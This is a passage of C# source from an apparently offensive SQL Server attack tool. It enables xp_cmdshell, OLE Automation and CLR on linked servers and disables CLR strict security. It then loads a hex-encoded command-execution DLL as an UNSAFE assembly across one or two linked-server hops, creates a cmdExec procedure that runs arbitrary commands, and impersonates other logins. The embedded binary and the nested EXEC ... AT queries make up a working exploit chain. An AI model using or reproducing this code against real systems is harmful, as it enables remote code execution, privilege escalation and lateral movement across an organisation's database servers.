                Configure config = new Configure();
                config.EnableDisableRpc(con, "0", linkedSqlServer);
            }
            // lenablexp
            else if (module.Equals("lenablexp"))
            {
                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "xp_cmdshell", "1", linkedSqlServer);
            }
            // ldisablexp
            else if (module.Equals("ldisablexp"))
            {
                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "xp_cmdshell", "0", linkedSqlServer);
            }
            // lenableole
            else if (module.Equals("lenableole"))
            {
                Console.Out.WriteLine("\n[+] Enabling OLE Automation Procedures on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "OLE Automation Procedures", "1", linkedSqlServer);
            }
            // ldisableole
            else if (module.Equals("ldisableole"))
            {
                Console.Out.WriteLine("\n[+] Disabling OLE Automation Procedures on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "OLE Automation Procedures", "0", linkedSqlServer);
            }
            // lenableclr
            else if (module.Equals("lenableclr"))
            {
                Console.Out.WriteLine("\n[+] Enabling CLR integration on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "clr enabled", "1", linkedSqlServer);
            }
            // ldisableclr
            else if (module.Equals("ldisableclr"))
            {
                Console.Out.WriteLine("\n[+] Disabling CLR integration on " + linkedSqlServer + " via " + sqlServer + ":");
                Configure config = new Configure();
                config.LinkedEnableDisable(con, "clr enabled", "0", linkedSqlServer);
            }
            // lxpcmd
            else if (module.Equals("lxpcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer + ":");
                XPCmdShell XPCmdShell = new XPCmdShell();
                XPCmdShell.LinkedCommand(con, option, linkedSqlServer);
            }
            else if (module.Equals("lolecmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer + ":");
                OLE Ole = new OLE();
                Ole.LinkedCommand(con, option, linkedSqlServer);
            }
            // lagentstatus
            else if (module.Equals("lagentstatus"))
            {
                Console.Out.WriteLine("\n[+] Getting SQL agent status on " + linkedSqlServer + " via " + sqlServer + ":");
                AgentJobs aj = new AgentJobs();
                aj.LinkedAgentStatus(con, sqlServer, linkedSqlServer);
            }





            // load at
            else if (module.Equals("xclrloadat"))
            {
               
                //////setup checks
                String sqlOutput = "";
                // get a list of linked sql servers
                sqlOutput = sqlQuery.ExecuteCustomQuery(con, "SELECT name FROM sys.servers WHERE is_linked = 1;");
                // check to see if the linked sql server exists
                if (!sqlOutput.ToLower().Contains(linkedSqlServer.ToLower()))
                {
                    Console.WriteLine("\n[!] ERROR: " + linkedSqlServer + " does not exist");
                    return;
                }
                // check to see if RPC is enabled on the linked sql server
                Configure config = new Configure();
                sqlOutput = config.CheckRpc(con, linkedSqlServer);
                if (sqlOutput.Equals("0"))
                {
                    Console.WriteLine("\n[!] ERROR: You need to enable RPC (enablerpc) on " + linkedSqlServer);
                    return;
                }
                //sqlQuery.ExecuteQuery(con, "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT " + linkedSqlServer);

                //sqlQuery.ExecuteQuery(con, "Exec('use msdb;') AT " + linkedSqlServer);

                //"EXEC('USE msdb; EXEC(''       info-pwn        '') ' ) AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] sp adv option1 enab~ " + sqlQuery.ExecuteQuery(con, "EXEC('use msdb; EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure; '') ') AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] clr enab linkk~ " + sqlQuery.ExecuteQuery(con, "EXEC(' use msdb; EXEC(''sp_configure ''''clr enabled'''',1; RECONFIGURE;'') ') AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] clr strictsec disable~ " + sqlQuery.ExecuteQuery(con, "EXEC('use msdb;  EXEC(''sp_configure ''''clr strict security'''', 0; RECONFIGURE;'') ') AT " + linkedSqlServer));
                
                // re
                Console.Out.WriteLine("\n[+] CLR custom assembly attack linking thruu " + sqlServer + " -> " + linkedSqlServer);


                //Console.Out.WriteLine("\n[+] try creaas: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT SYSTEM_USER;"));
                //Console.Out.WriteLine("\n[+] impersonate userr " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));
                //Console.Out.WriteLine("\n[+] enable optionss " + sqlQuery.ExecuteQuery(con, "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;   "));
                
                Console.Out.WriteLine("\n[+] Executing " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteQuery(con, "EXEC('use msdb; CREATE ASSEMBLY my_assembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500006486020093DC70B20000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000730A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F403000023537472696E67730000000018070000580000002355530070070000100000002347554944000000800700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E0113030600FB0113030600AC00E1020F00330300000600D40077020600710177020600520177020600E20177020600AE0177020600C70177020600010177020600C000F40206009E00F40206003501770206001C012D020600850370020A00EB00C0020A00470242030E006803E1020A006200C0020E009702E10206005D0270020A002000C0020A008E0014000A00D703C0020A008600C0020600A8020A000600B5020A000000000001000000000001000100010010005703000041000100010048200000000096003500620001000921000000008618DB02060002000000010056000900DB0201001100DB0206001900DB020A002900DB0210003100DB0210003900DB0210004100DB0210004900DB0210005100DB0210005900DB0210006100DB0215006900DB0210007100DB0210007900DB0210008900DB0206009900DB020600990089022100A90070001000B1007E032600A90070031000A90019021500A900BC0315009900A3032C00B900DB023000A100DB023800C9007D003F00D100980344009900A9034A00E1003D004F00810051024F00A1005A025300D100E2034400D1004700060099008C0306009900980006008100DB02060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007002000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700636D64457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000CA057959B4FE5F4D86851392351B07D600042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C010007636D6445786563000005010000000017010012436F7079726967687420C2A920203230323200002901002437373336623532612D353938632D343034322D386538662D64363434643864303965356400000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000006FAFECB90000000002000000570000001C2A00001C0C00000000000000000000000000001000000000000000000000000000000052534453E857F1B36927AD42BE88208A067847EA01000000433A5C55736572735C646576325C736F757263655C7265706F735C636D64457865635C6F626A5C7836345C52656C656173655C636D64457865632E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E000000000063006D00640045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006D00640045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D00640045007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D0065000000000063006D00640045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE ') AT " + linkedSqlServer));

                //Console.Out.WriteLine("\n[+] use msdb try " + sqlQuery.ExecuteQuery(con, "EXEC('use msdb  ') AT " + linkedSqlServer));

                //this defaults to master database.... cant start by prepending use msdb; ..... 
                //Console.Out.WriteLine("\n[+] create procedure cmdExec at linkkd " + sqlQuery.ExecuteQuery(con, "EXEC('CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];  ') AT " + linkedSqlServer));
                // ok... try inceptttion
                Console.Out.WriteLine("\n[+] create procedure cmdExec at linkkd " + sqlQuery.ExecuteQuery(con, "EXEC('USE msdb; EXEC(''CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];   '') ' ) AT " + linkedSqlServer));


                //Console.Out.WriteLine("\n[+] create procedure cmdExec at linkkkkdd " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];"));


                Console.Out.WriteLine("\n[+] demo whoami command linkdd  " + sqlQuery.ExecuteQuery(con, "EXEC('USE msdb; EXEC(''cmdExec whoami  '')' ) AT " + linkedSqlServer));

            }
            //xclr exec command at 
            else if (module.Equals("xclrxat"))
            {
                Console.Out.WriteLine("\n[+] CLR custom assembly attack linking thruu " + sqlServer + " -> " + linkedSqlServer);

                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer + " via " + sqlServer);

                //Console.Out.WriteLine("\n[+] impersonate userr " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));

                //Console.Out.WriteLine("\n[+] switch db~ msdb " + sqlQuery.ExecuteQuery(con, "use msdb;"));

                //Console.Out.WriteLine("\n[+] Command   " + sqlQuery.ExecuteQuery(con, "EXEC cmdExec  '" + option + "';"));

                Console.Out.WriteLine("\n[+] Command  " + sqlQuery.ExecuteQuery(con, "EXEC('USE msdb; EXEC(''cmdExec ''''" + option + "''''  '')' ) AT " + linkedSqlServer));

            }

            //xclrClean at
            else if (module.Equals("xclrcleanat"))
            {
                Console.Out.WriteLine("\n[+] CLR custom assembly cleanup on " + linkedSqlServer + " ~~ thruu " + sqlServer + " -> " + linkedSqlServer);

                Console.Out.WriteLine("\n[+] dropprocedure cmdExec on linkdd " + sqlQuery.ExecuteQuery(con, "EXEC('USE msdb; EXEC(''  DROP PROCEDURE cmdExec;  '')' ) AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] dropprocedure cmdExec on linkdd " + sqlQuery.ExecuteQuery(con, "EXEC('USE msdb; EXEC(''  DROP ASSEMBLY my_assembly;  '')' ) AT " + linkedSqlServer));

                
            }

            // // // double hop linked
            else if (module.Equals("llxload"))
            {

                //////setup checks
                String sqlOutput = "";
                // get a list of linked sql servers
                sqlOutput = sqlQuery.ExecuteCustomQuery(con, "SELECT name FROM sys.servers WHERE is_linked = 1;");
                // check to see if the linked sql server exists
                if (!sqlOutput.ToLower().Contains(linkedSqlServer.ToLower()))
                {
                    Console.WriteLine("\n[!] ERROR: " + linkedSqlServer + " does not exist");
                    return;
                }
                // check to see if RPC is enabled on the linked sql server
                Configure config = new Configure();
                sqlOutput = config.CheckRpc(con, linkedSqlServer);
                if (sqlOutput.Equals("0"))
                {
                    Console.WriteLine("\n[!] ERROR: You need to enable RPC (enablerpc) on " + linkedSqlServer);
                    return;
                }

                Console.Out.WriteLine("\n[+] -> " + sqlServer + " -> " + linkedSqlServer + " -> " + linkedSqlServer2);


                // meee7
                //Console.Out.WriteLine("\n[+] sp adv optionenablll " + sqlQuery.ExecuteQuery(con, "EXEC ('EXEC('' use msdb; EXEC(''''sp_configure ''''''''show advanced options'''''''',1; RECONFIGURE;'''') '')  AT appsrv01 ')AT dc01"));
                Console.Out.WriteLine("\n[+] sp adv optionenablll " + sqlQuery.ExecuteQuery(con, "EXEC ('EXEC('' use msdb; EXEC(''''sp_configure ''''''''show advanced options'''''''',1; RECONFIGURE;'''') '')  AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] clr enab onllink~ " + sqlQuery.ExecuteQuery(con, "EXEC ('EXEC('' use msdb; EXEC(''''sp_configure ''''''''clr enabled'''''''',1; RECONFIGURE;'''') '') AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] clr strictsec disable~ " + sqlQuery.ExecuteQuery(con, "EXEC ('EXEC(''use msdb;  EXEC(''''sp_configure ''''''''clr strict security'''''''', 0; RECONFIGURE;'''') '') AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));



                Console.Out.WriteLine("\n[+] Executing " + option + " on " + linkedSqlServer2 + " via " + sqlServer + " and " + linkedSqlServer + ": " + sqlQuery.ExecuteQuery(con, "EXEC('EXEC(''use msdb; CREATE ASSEMBLY my_assembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500006486020093DC70B20000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000730A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F403000023537472696E67730000000018070000580000002355530070070000100000002347554944000000800700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E0113030600FB0113030600AC00E1020F00330300000600D40077020600710177020600520177020600E20177020600AE0177020600C70177020600010177020600C000F40206009E00F40206003501770206001C012D020600850370020A00EB00C0020A00470242030E006803E1020A006200C0020E009702E10206005D0270020A002000C0020A008E0014000A00D703C0020A008600C0020600A8020A000600B5020A000000000001000000000001000100010010005703000041000100010048200000000096003500620001000921000000008618DB02060002000000010056000900DB0201001100DB0206001900DB020A002900DB0210003100DB0210003900DB0210004100DB0210004900DB0210005100DB0210005900DB0210006100DB0215006900DB0210007100DB0210007900DB0210008900DB0206009900DB020600990089022100A90070001000B1007E032600A90070031000A90019021500A900BC0315009900A3032C00B900DB023000A100DB023800C9007D003F00D100980344009900A9034A00E1003D004F00810051024F00A1005A025300D100E2034400D1004700060099008C0306009900980006008100DB02060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007002000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700636D64457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000CA057959B4FE5F4D86851392351B07D600042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C010007636D6445786563000005010000000017010012436F7079726967687420C2A920203230323200002901002437373336623532612D353938632D343034322D386538662D64363434643864303965356400000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000006FAFECB90000000002000000570000001C2A00001C0C00000000000000000000000000001000000000000000000000000000000052534453E857F1B36927AD42BE88208A067847EA01000000433A5C55736572735C646576325C736F757263655C7265706F735C636D64457865635C6F626A5C7836345C52656C656173655C636D64457865632E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E000000000063006D00640045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006D00640045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D00640045007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D0065000000000063006D00640045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE '') AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));


                Console.Out.WriteLine("\n[+] create procedure cmdExec at linkkd " + sqlQuery.ExecuteQuery(con, "EXEC('EXEC(''USE msdb; EXEC(''''CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];   '''') '' ) AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));


                Console.Out.WriteLine("\n[+] demo whoami command linkdd 2x hop  " + sqlQuery.ExecuteQuery(con, "EXEC('EXEC(''USE msdb; EXEC(''''cmdExec whoami  '''')'' ) AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));

            }
            //ll exec  
            else if (module.Equals("llxx"))
            {
                Console.Out.WriteLine("\n[+] CLR custom assembly attack linking thruu " + sqlServer + " -> " + linkedSqlServer + " -> " + linkedSqlServer2);

                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + linkedSqlServer2 + " via " + sqlServer + " and " + linkedSqlServer);

                //Console.Out.WriteLine("\n[+] impersonate userr " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));

                //Console.Out.WriteLine("\n[+] switch db~ msdb " + sqlQuery.ExecuteQuery(con, "use msdb;"));

                //Console.Out.WriteLine("\n[+] Command   " + sqlQuery.ExecuteQuery(con, "EXEC cmdExec  '" + option + "';"));

                Console.Out.WriteLine("\n[+] Command  " + sqlQuery.ExecuteQuery(con, "EXEC('EXEC(''USE msdb; EXEC(''''cmdExec ''''''''" + option + "''''''''  '''')'' ) AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));

            }

            //ll clean 
            else if (module.Equals("llxclean"))
            {
                Console.Out.WriteLine("\n[+] CLR custom assembly cleanup -> " + sqlServer + " -> " + linkedSqlServer + " -> " + linkedSqlServer2 );

                Console.Out.WriteLine("\n[+] dropprocedure cmdExec on linkdd 2x hop " + sqlQuery.ExecuteQuery(con, "EXEC('EXEC(''USE msdb; EXEC(''''  DROP PROCEDURE cmdExec;  '''')'' ) AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));

                Console.Out.WriteLine("\n[+] drop my_assembly on linkdd 2x hop " + sqlQuery.ExecuteQuery(con, "EXEC('EXEC(''USE msdb; EXEC(''''  DROP ASSEMBLY my_assembly;  '''')'' ) AT " + linkedSqlServer2 + "')AT " + linkedSqlServer));


            }



            // ###############################################
            // ########## Impersonation SQL Modules ##########
            // ###############################################

            // iwhoami
            else if (module.Equals("iwhoami"))
            {

                Console.Out.WriteLine("\n[+] Origin-~ logged in as: " + sqlQuery.ExecuteQuery(con, "SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Origin-~ Mapped to the user: " + sqlQuery.ExecuteQuery(con, "SELECT USER_NAME(); "));

                Console.Out.WriteLine("\n[+] Origin-~ Roles: ");
                Roles Roles = new Roles();
                Roles.Server(con, "public");
                Roles.Server(con, "sysadmin");

                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';SELECT USER_NAME();"));

                Console.Out.WriteLine("\n[+] Roles: ");
                //Roles Roles = new Roles();
                Roles.Impersonate(con, "public", impersonate);
                Roles.Impersonate(con, "sysadmin", impersonate);
            }

            // xiwhoami - ~ 
            else if (module.Equals("xiwhoami"))
            {

                Console.Out.WriteLine("\n[+] Origin-~ logged in as: " + sqlQuery.ExecuteQuery(con, "SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Origin-~ Mapped to the user: " + sqlQuery.ExecuteQuery(con, "SELECT USER_NAME(); "));

                Console.Out.WriteLine("\n[+] Origin-~ Roles: ");
                Roles Roles = new Roles();
                Roles.Server(con, "public");
                Roles.Server(con, "sysadmin");


                // Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SYSTEM_USER;"));
                // Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';SELECT USER_NAME();"));

                //Console.Out.WriteLine("\n[+]   ~~before imp- guest imp:");
